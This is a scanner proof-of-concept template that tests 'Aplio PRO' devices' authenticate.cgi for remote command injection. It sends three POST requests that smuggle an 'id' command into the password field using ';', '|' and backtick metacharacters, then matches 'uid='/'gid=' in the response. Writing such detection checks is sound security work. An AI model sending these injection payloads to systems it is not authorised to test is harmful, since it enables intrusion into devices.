[info]
author = "ave"
description = "向 Aplio PRO 设备的 authenticate.cgi 发送包含 shell 元字符的 password 参数，验证是否存在命令注入漏洞。若注入命令（如 id）的输出回显在响应体中，则判定存在漏洞。"
id = "POC-AVE-2000-1014"
name = "Aplio PRO authenticate.cgi 远程命令执行 PoC"
severity = "high"
tags = ["ave-2000-1014"]
vuln_id = [
    "CVE-2000-0923",
    "AVE-2000-1014",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/authenticate.cgi"
protocol = "http"

[poc.requests.body]
content = "password=test%3Bid"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/authenticate.cgi"
protocol = "http"

[poc.requests.body]
content = "password=test%7Cid"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/authenticate.cgi"
protocol = "http"

[poc.requests.body]
content = "password=test%60id%60"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]
